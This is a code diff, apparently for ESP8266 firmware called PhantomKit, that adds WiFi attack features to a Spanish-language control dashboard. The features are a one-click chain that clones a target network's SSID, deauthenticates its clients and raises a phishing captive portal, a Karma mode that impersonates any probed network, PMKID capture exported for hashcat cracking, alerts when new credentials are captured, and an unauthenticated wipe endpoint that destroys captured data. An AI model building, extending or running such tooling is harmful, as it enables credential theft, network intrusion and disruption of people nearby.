@@ -4,6 +4,10 @@
 #include "../notifier.h"
 
 extern NotifierModule notifier;
+extern PMKIDCaptureModule pmkidModule;
+extern void karmaCallback(const String& ssid, int tpl);
+extern APManager apManager;
+extern CaptivePortal captivePortal;
 
 extern String logBuffer;
 
@@ -85,10 +89,10 @@ uS();uC();uL();setInterval(uS,2000);setInterval(uC,3000);setInterval(uL,1000)
 PhantomWebServer::PhantomWebServer(CredentialStore& store, CaptivePortal& portal, APManager& ap,
                                      DeauthModule& deauth, BeaconFloodModule& beacon,
                                      ProbeSnifferModule& probe, EvilTwinModule& evilTwin,
-                                     AutoPortalModule& autoPortal)
+                                     AutoPortalModule& autoPortal, PMKIDCaptureModule& pmkid)
     : server(80), store(store), portal(portal), ap(ap),
       deauth(deauth), beacon(beacon), probe(probe),
-      evilTwin(evilTwin), autoPortal(autoPortal) {
+      evilTwin(evilTwin), autoPortal(autoPortal), pmkid(pmkid) {
     generateSessionToken();
 }
 
@@ -230,6 +234,29 @@ void PhantomWebServer::begin() {
     });
     server.on("/api/export/csv",    HTTP_GET, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIExportCSV(); });
     server.on("/api/export/report", HTTP_GET, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIExportReport(); });
+
+    // Auto-Attack chain
+    server.on("/api/autoattack", HTTP_POST, [this]() {
+        if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; }
+        handleAPIAutoAttack();
+    });
+
+    // Karma mode
+    server.on("/api/karma", HTTP_POST, [this]() {
+        if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; }
+        handleAPIKarma();
+    });
+
+    // PMKID capture
+    server.on("/api/pmkid",         HTTP_POST, [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } handleAPIPMKID(); });
+    server.on("/api/pmkid/results", HTTP_GET,  [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; } server.send(200, "application/json", pmkid.getJSON()); });
+    server.on("/api/pmkid/export",  HTTP_GET,  [this]() { if (!isAuthenticated()) { server.send(401, "text/plain", "Unauthorized"); return; }
+        server.sendHeader("Content-Disposition", "attachment; filename=\"pmkids.hc22000\"");
+        server.send(200, "text/plain", pmkid.getHashcatOutput());
+    });
+
+    // Emergency panic wipe (no auth — intentional for emergency)
+    server.on("/api/panic", HTTP_POST, [this]() { handleAPIPanic(); });
     server.onNotFound([this]() {
         if (portal.isActive()) {
             String fn = String("/templates/") + TEMPLATES[portal.getCurrentTemplate()];
@@ -262,13 +289,33 @@ void PhantomWebServer::handleDashboard() {
     
     html += "<nav class='tabs'>";
     html += "<button class='tab a' onclick='showTab(this,\"portal\")'>Portal</button>";
+    html += "<button class='tab' onclick='showTab(this,\"autoattack\")'>&#9889; Auto-Attack</button>";
     html += "<button class='tab' onclick='showTab(this,\"deauth\")'>Deauth</button>";
     html += "<button class='tab' onclick='showTab(this,\"beacon\")'>Beacon</button>";
     html += "<button class='tab' onclick='showTab(this,\"probe\")'>Probe</button>";
+    html += "<button class='tab' onclick='showTab(this,\"pmkid\")'>PMKID</button>";
     html += "<button class='tab' onclick='showTab(this,\"eviltwin\")'>Evil Twin</button>";
     html += "<button class='tab' onclick='showTab(this,\"settings\")'>Ajustes</button>";
     html += "</nav>";
     
+    html += "<div id='tab-autoattack' style='display:none'><div class='g'>";
+    html += "<div class='card'><h2>&#9889; Auto-Attack</h2>";
+    html += "<p style='color:#666;font-size:11px;margin-bottom:12px'>Un clic: escanea, cambia SSID, deautentica clientes y activa el portal con el template ideal.</p>";
+    html += "<div class='fg'><button class='bp' onclick='scanAA()'>1. Escanear redes</button></div>";
+    html += "<div id='aat'><p class='e'>Presiona Escanear</p></div>";
+    html += "<div class='fg'><label>SSID objetivo (auto-detectado)</label><input type='text' id='aaSsid' placeholder='Red objetivo'></div>";
+    html += "<div class='fg'><label>BSSID</label><input type='text' id='aaBssid' placeholder='AA:BB:CC:DD:EE:FF'></div>";
+    html += "<div class='fg'><label>Canal</label><input type='number' id='aaCh' min='1' max='13' value='6'></div>";
+    html += "<div id='aaTplMsg' style='font-size:11px;color:#00d4ff;margin-bottom:8px'></div>";
+    html += "<div class='bg'>";
+    html += "<button class='bd' id='bAAS' onclick='startAA()'>&#9889; ATACAR</button>";
+    html += "<button class='bp' id='bAAP' onclick='stopAA()' style='display:none'>Detener</button>";
+    html += "</div></div>";
+    html += "<div class='card'><h2>Estado</h2><div class='stats'>";
+    html += "<div class='stat'><span class='sv' id='sAAT'>-</span><span class='sl'>Template</span></div>";
+    html += "<div class='stat'><span class='sv' id='sAAS'>Inactivo</span><span class='sl'>Estado</span></div>";
+    html += "</div></div></div></div>";
+
     html += "<div id='tab-portal'><div class='g'>";
     html += "<div class='card'><h2>Control del Portal</h2>";
     html += "<div class='fg'><label>SSID Actual</label><div class='sd' id='cs'>PhantomKit</div></div>";
@@ -343,8 +390,33 @@ void PhantomWebServer::handleDashboard() {
     html += "<div class='stat'><span class='sv' id='sET'>-</span><span class='sl'>Objetivo</span></div>";
     html += "</div></div></div></div>";
 
-    // Settings tab: Notifications + Stealth Mode
+    // PMKID tab
+    html += "<div id='tab-pmkid' style='display:none'><div class='g'>";
+    html += "<div class='card'><h2>PMKID Capture</h2>";
+    html += "<p style='color:#666;font-size:11px;margin-bottom:12px'>Captura WPA2 PMKIDs del primer frame EAPOL (sin cliente requerido). Combinalo con Deauth para forzar reconexion. Exporta en formato hashcat 22000.</p>";
+    html += "<div class='fg'><label>BSSID objetivo (vacio = todos)</label><input type='text' id='pmBssid' placeholder='AA:BB:CC:DD:EE:FF (opcional)'></div>";
+    html += "<div class='bg'>";
+    html += "<button class='bs' id='bPMS' onclick='startPM()'>Iniciar captura</button>";
+    html += "<button class='bp' id='bPMP' onclick='stopPM()' style='display:none'>Detener</button>";
+    html += "<a id='pmExport' href='/api/pmkid/export' class='bp' style='padding:8px 16px;text-decoration:none;font-size:11px'>&#8595; Exportar .hc22000</a>";
+    html += "</div></div>";
+    html += "<div class='card f'><h2>PMKIDs capturados</h2><div id='pmList'><p class='e'>Inicia la captura y activa Deauth para forzar reconexiones</p></div></div>";
+    html += "<div class='card'><h2>Estado</h2><div class='stats'>";
+    html += "<div class='stat'><span class='sv' id='sPMC'>0</span><span class='sl'>PMKIDs</span></div>";
+    html += "<div class='stat'><span class='sv' id='sPMS'>Inactivo</span><span class='sl'>Estado</span></div>";
+    html += "</div></div></div></div>";
+
+    // Settings tab: Notifications + Stealth Mode + Karma
     html += "<div id='tab-settings' style='display:none'><div class='g'>";
+    html += "<div class='card'><h2>&#9760; Karma Attack</h2>";
+
+    html += "<p style='color:#666;font-size:11px;margin-bottom:12px'>Responde automaticamente a cualquier probe request. El ESP cambia su SSID para coincidir con la red buscada por el dispositivo.</p>";
+    html += "<div class='fg'><label>Estado: <span id='karmaLbl'>Inactivo</span></label></div>";
+    html += "<div class='bg'><button class='bd' onclick='startKarma()'>Activar Karma</button><button class='bp' onclick='stopKarma()'>Detener</button></div>";
+    html += "<p id='karmaSSID' style='font-size:11px;color:#00d4ff;margin-top:8px'></p></div>";
+    html += "<div class='card'><h2>&#128680; Emergency Wipe</h2>";
+    html += "<p style='color:#666;font-size:11px;margin-bottom:12px'>Borra TODAS las credenciales y reinicia el dispositivo. Tambien puedes mantener el boton FLASH 3s.</p>";
+    html += "<button class='bd' onclick='if(confirm(\"BORRAR TODO?\"))panic()' style='background:#ff1744'>EMERGENCY WIPE</button></div>";
     html += "<div class='card'><h2>Notificaciones (Webhook)</h2>";
     html += "<p style='color:#666;font-size:11px;margin-bottom:12px'>Recibe capturas en tiempo real via ntfy.sh o webhook HTTP. Requiere uplink WiFi con internet.</p>";
     html += "<div class='fg'><label>URL (ej: ntfy.sh o tu-servidor.com/path)</label><input type='text' id='nURL' placeholder='ntfy.sh' style='width:100%;box-sizing:border-box'></div>";
@@ -367,12 +439,39 @@ void PhantomWebServer::handleDashboard() {
     html += "\nfunction uP(){fetch('/api/probe/devices').then(function(r){return r.json()}).then(function(d){";
     html += "document.getElementById('sPD').textContent=d.length;";
     html += "if(d.length===0){document.getElementById('pd').innerHTML='<p class=e>Sin dispositivos</p>';return}";
-    html += "var h='<table><thead><tr><th>MAC</th><th>SSIDs buscados</th><th>RSSI</th></tr></thead><tbody>';";
-    html += "for(var i=0;i<d.length;i++){var x=d[i];h+='<tr><td style=color:#00d4ff>'+x.mac+'</td><td>'+x.ssids.join(', ')+'</td><td>'+x.rssi+'dBm</td></tr>'}";
+    html += "var h='<table><thead><tr><th>MAC</th><th>Fabricante</th><th>SSIDs buscados</th><th>RSSI</th><th></th></tr></thead><tbody>';";
+    html += "for(var i=0;i<d.length;i++){var x=d[i];";
+    html += "h+='<tr><td style=color:#00d4ff>'+x.mac+'</td><td style=color:#7b2ff7>'+x.vendor+'</td><td>'+x.ssids.join(', ')+'</td><td>'+x.rssi+'dBm</td>'";
+    html += "+\"<td><button class='bp' style='font-size:10px;padding:3px 8px' onclick='quickAttack(\\\"\"+(x.ssids[0]||'')+\"\\\",\\\"\"+(x.mac||'')+\"\\\")'>Atacar</button></td></tr>'}";
     html += "h+='</tbody></table>';document.getElementById('pd').innerHTML=h})}";
-    html += "\nfunction saveNotify(){var u=document.getElementById('nURL').value,t=document.getElementById('nTopic').value;p('/api/notify','action=save&url='+encodeURIComponent(u)+'&topic='+encodeURIComponent(t)).then(function(){document.getElementById('nStatus').textContent='Guardado';document.getElementById('nStatus').style.color='#00ff88'})}";
-    html += "\nfunction testNotify(){var u=document.getElementById('nURL').value,t=document.getElementById('nTopic').value;p('/api/notify','action=test&url='+encodeURIComponent(u)+'&topic='+encodeURIComponent(t)).then(function(r){return r.json()}).then(function(d){document.getElementById('nStatus').textContent=d.ok?'Notificacion enviada OK':'Error de envio';document.getElementById('nStatus').style.color=d.ok?'#00ff88':'#ff4444'})}";
-    html += "\nfunction setStealth(v){p('/api/stealth','enabled='+v).then(function(){document.getElementById('sthLbl').textContent=v?'Activo':'Inactivo'})}";
+    // Auto-attack scan
+    html += "\nfunction scanAA(){p('/api/deauth','action=scan').then(function(r){return r.text()}).then(function(t){var d=JSON.parse(t);";
+    html += "if(!d.length){document.getElementById('aat').innerHTML='<p class=e>Sin redes</p>';return}";
+    html += "var h='<table><thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>dBm</th><th></th></tr></thead><tbody>';";
+    html += "for(var i=0;i<d.length;i++){var x=d[i];h+='<tr><td>'+x.ssid+'</td><td style=color:#00d4ff>'+x.bssid+'</td><td>'+x.channel+'</td><td>'+x.rssi+'</td>'";
+    html += "+\"<td><button class='bs' style='font-size:10px;padding:3px 8px' onclick='fillAA(\\\"\"+(x.ssid)+\"\\\",\\\"\"+(x.bssid)+'\",\"+(x.channel)+')>Sel</button></td></tr>'}";
+    html += "h+='</tbody></table>';document.getElementById('aat').innerHTML=h})}";
+    html += "\nfunction fillAA(s,b,c){document.getElementById('aaSsid').value=s;document.getElementById('aaBssid').value=b;document.getElementById('aaCh').value=c;";
+    html += "fetch('/api/autoattack?action=suggest&ssid='+encodeURIComponent(s)).then(function(r){return r.json()}).then(function(d){document.getElementById('aaTplMsg').textContent='Template sugerido: '+d.template_name})}";
+    html += "\nfunction startAA(){var s=document.getElementById('aaSsid').value,b=document.getElementById('aaBssid').value,c=document.getElementById('aaCh').value;";
+    html += "p('/api/autoattack','action=start&ssid='+encodeURIComponent(s)+'&bssid='+encodeURIComponent(b)+'&channel='+c).then(function(r){return r.json()}).then(function(d){";
+    html += "if(d.ok){document.getElementById('bAAS').style.display='none';document.getElementById('bAAP').style.display='';document.getElementById('sAAS').textContent='Activo';document.getElementById('sAAT').textContent=d.template_name}})}";
+    html += "\nfunction stopAA(){p('/api/autoattack','action=stop').then(function(){document.getElementById('bAAS').style.display='';document.getElementById('bAAP').style.display='none';document.getElementById('sAAS').textContent='Inactivo'})}";
+    html += "\nfunction quickAttack(ssid,mac){showTab(document.querySelector('.tab'),\'autoattack\');document.getElementById('aaSsid').value=ssid;document.getElementById('aaBssid').value=mac}";
+    // PMKID
+    html += "\nfunction startPM(){var b=document.getElementById('pmBssid').value;p('/api/pmkid','action=start&bssid='+encodeURIComponent(b)).then(function(){document.getElementById('bPMS').style.display='none';document.getElementById('bPMP').style.display='';document.getElementById('sPMS').textContent='Capturando'})}";
+    html += "\nfunction stopPM(){p('/api/pmkid','action=stop').then(function(r){return r.json()}).then(function(d){document.getElementById('bPMS').style.display='';document.getElementById('bPMP').style.display='none';document.getElementById('sPMC').textContent=d.count;document.getElementById('sPMS').textContent='Detenido';uPM()})}";
+    html += "\nfunction uPM(){fetch('/api/pmkid/results').then(function(r){return r.json()}).then(function(d){document.getElementById('sPMC').textContent=d.length;if(!d.length){document.getElementById('pmList').innerHTML='<p class=e>Sin PMKIDs</p>';return}var h='<table><thead><tr><th>AP MAC</th><th>STA MAC</th><th>Hashcat</th></tr></thead><tbody>';for(var i=0;i<d.length;i++){var x=d[i];h+='<tr><td style=color:#00d4ff>'+x.ap+'</td><td>'+x.sta+'</td><td style=font-size:9px;word-break:break-all>'+x.hashcat+'</td></tr>'}h+='</tbody></table>';document.getElementById('pmList').innerHTML=h})}";
+    // Karma
+    html += "\nfunction startKarma(){p('/api/karma','action=start').then(function(){document.getElementById('karmaLbl').textContent='ACTIVO';document.getElementById('karmaLbl').style.color='#ff4444'})}";
+    html += "\nfunction stopKarma(){p('/api/karma','action=stop').then(function(){document.getElementById('karmaLbl').textContent='Inactivo';document.getElementById('karmaLbl').style.color=''})}";
+    // Panic wipe
+    html += "\nfunction panic(){fetch('/api/panic',{method:'POST'}).then(function(){document.body.innerHTML='<div style=color:#ff4444;text-align:center;padding:40px>WIPE COMPLETADO</div>'})}";
+    // Toast: detect new credentials
+    html += "\nvar _prevCreds=0;function chkToast(d){if(d.credentials>_prevCreds&&_prevCreds>0){showToast('Nueva credencial capturada (#'+d.credentials+')')}  _prevCreds=d.credentials}";
+    html += "\nfunction showToast(msg){var t=document.createElement('div');t.style='position:fixed;top:16px;right:16px;background:#00d4ff;color:#000;padding:12px 20px;border-radius:8px;font-family:monospace;font-weight:700;z-index:9999;box-shadow:0 4px 20px rgba(0,212,255,.4);animation:slideIn .3s ease';t.textContent=msg;document.body.appendChild(t);setTimeout(function(){t.remove()},5000)}";
+    html += "\n/* status poll override to include chkToast and PMKID poll */";
+    html += "\nsetInterval(function(){fetch('/api/status').then(function(r){return r.json()}).then(function(d){chkToast(d);document.getElementById('sC').textContent=d.clients;document.getElementById('sR').textContent=d.credentials;document.getElementById('sDF').textContent=d.deauth_frames;document.getElementById('sDS').textContent=d.deauth_active?'Activo':'Inactivo';document.getElementById('sBC').textContent=d.beacon_count;document.getElementById('sBS').textContent=d.beacon_active?'Activo':'Inactivo';document.getElementById('sPC').textContent=d.probe_count;document.getElementById('sPD').textContent=d.probe_devices||0;document.getElementById('sPS').textContent=d.probe_active?'Activo':'Inactivo';document.getElementById('sPMC').textContent=d.pmkid_count||0;document.getElementById('sPMS').textContent=d.pmkid_active?'Capturando':'Inactivo';if(d.karma_active){document.getElementById('karmaLbl').textContent='ACTIVO - '+d.karma_ssid;document.getElementById('karmaLbl').style.color='#ff4444'}else{document.getElementById('karmaLbl').textContent='Inactivo';document.getElementById('karmaLbl').style.color=''}var dot=document.getElementById('sd');var st=document.getElementById('st');if(d.portal_active){dot.style.background='#00ff88';st.textContent='Portal activo'}else{dot.style.background='#ff4444';st.textContent='Inactivo'}})},3000);";
     html += "</script></body></html>";
 
     server.send(200, "text/html", html);
@@ -392,6 +491,11 @@ void PhantomWebServer::handleAPIStatus() {
     j += "\"beacon_count\":" + String(beacon.getBeaconsSent()) + ",";
     j += "\"probe_active\":" + String(probe.isRunning() ? "true" : "false") + ",";
     j += "\"probe_count\":" + String(probe.getProbesCaptured()) + ",";
+    j += "\"probe_devices\":" + String(probe.getDeviceCount()) + ",";
+    j += "\"karma_active\":" + String(probe.isKarmaActive() ? "true" : "false") + ",";
+    j += "\"karma_ssid\":\"" + probe.getKarmaSSID() + "\",";
+    j += "\"pmkid_count\":" + String(pmkid.getCaptureCount()) + ",";
+    j += "\"pmkid_active\":" + String(pmkid.isCapturing() ? "true" : "false") + ",";
     j += "\"eviltwin_active\":" + String(evilTwin.isActive() ? "true" : "false");
     j += "}";
     server.send(200, "application/json", j);
@@ -478,6 +582,97 @@ void PhantomWebServer::handleAPIExportCSV() {
     server.sendHeader("Content-Length", String(f.size()));
     server.streamFile(f, "text/csv");
     f.close();
+}
+
+// ---------------------------------------------------------------------------
+// handleAPIAutoAttack — chains scan → deauth → portal in one call
+// ---------------------------------------------------------------------------
+void PhantomWebServer::handleAPIAutoAttack() {
+    String action = server.arg("action");
+    String bssid  = server.arg("bssid");
+    String ssid   = server.arg("ssid");
+    int    ch     = server.arg("channel").toInt();
+
+    if (action == "suggest") {
+        int tpl = AutoPortalModule::suggestTemplate(ssid);
+        String j = "{\"ok\":true,\"template\":" + String(tpl);
+        j += ",\"template_name\":\"" + AutoPortalModule::getTemplateNameFor(ssid) + "\"}";
+        server.send(200, "application/json", j);
+        return;
+    }
+    if (action == "start" && bssid.length() == 17 && ch > 0) {
+        // 1. Auto-match template from SSID
+        int tpl = AutoPortalModule::suggestTemplate(ssid);
+        // 2. Set AP SSID to target SSID
+        ap.setSSID(ssid.length() > 0 ? ssid : ap.getSSID());
+        ap.restartAP();
+        // 3. Start deauth
+        deauth.startAttack(bssid, ch);
+        // 4. Set template + activate portal
+        portal.setTemplate(tpl);
+        portal.setActive(true);
+        String j = "{\"ok\":true,\"template\":" + String(tpl);
+        j += ",\"template_name\":\"" + AutoPortalModule::getTemplateNameFor(ssid) + "\"}";
+        server.send(200, "application/json", j);
+    } else if (action == "stop") {
+        deauth.stopAttack();
+        portal.setActive(false);
+        server.send(200, "application/json", "{\"ok\":true}");
+    } else {
+        server.send(400, "text/plain", "Parametros invalidos");
+    }
+}
+
+// ---------------------------------------------------------------------------
+// handleAPIKarma — toggle karma mode on probe sniffer
+// ---------------------------------------------------------------------------
+void PhantomWebServer::handleAPIKarma() {
+    String action = server.arg("action");
+    if (action == "start") {
+        // Ensure probe sniffer is running
+        if (!probe.isRunning()) probe.startSniffing(1);
+        probe.setKarmaMode(true, karmaCallback);
+        server.send(200, "application/json", "{\"ok\":true,\"karma\":true}");
+    } else if (action == "stop") {
+        probe.setKarmaMode(false);
+        server.send(200, "application/json", "{\"ok\":true,\"karma\":false}");
+    } else {
+        server.send(400, "text/plain", "action requerido: start|stop");
+    }
+}
+
+// ---------------------------------------------------------------------------
+// handleAPIPMKID — start/stop PMKID capture
+// ---------------------------------------------------------------------------
+void PhantomWebServer::handleAPIPMKID() {
+    String action = server.arg("action");
+    String bssid  = server.arg("bssid");
+    if (action == "start") {
+        pmkid.startCapture(bssid);
+        server.send(200, "application/json", "{\"ok\":true}");
+    } else if (action == "stop") {
+        pmkid.stopCapture();
+        server.send(200, "application/json",
+            String("{\"ok\":true,\"count\":") + pmkid.getCaptureCount() + "}");
+    } else {
+        server.send(400, "text/plain", "action requerido: start|stop");
+    }
+}
+
+// ---------------------------------------------------------------------------
+// handleAPIPanic — emergency wipe (no auth required)
+// ---------------------------------------------------------------------------
+void PhantomWebServer::handleAPIPanic() {
+    if (!LittleFS.begin()) {
+        server.send(500, "text/plain", "LittleFS error");
+        return;
+    }
+    // Clear all sensitive data
+    LittleFS.remove("/credentials.csv");
+    LittleFS.remove("/notify.cfg");
+    server.send(200, "text/plain", "WIPE OK - reiniciando");
+    delay(300);
+    ESP.restart();
 }
 
 void PhantomWebServer::handleAPIExportReport() {
